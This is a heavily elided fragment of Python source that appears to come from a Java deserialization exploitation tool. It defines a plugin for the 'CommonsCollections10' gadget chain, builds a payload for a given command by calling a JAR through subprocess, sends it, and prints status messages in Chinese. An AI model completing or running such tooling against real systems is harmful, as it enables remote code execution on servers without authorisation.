...
@Idea.plugin_register('Class11:CommonsCollections10')
class CommonsCollections10(object):
    ...
    def generator(self, String, fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections10', command],       #popen
        ...
        try:
            ...
            if(r.status_code==200):
                ...
                print("[-]   CommonsCollections10模块   key: {} 发送异常！\n[-]   状态码:{}".format(str(key),str(r.status_code)))
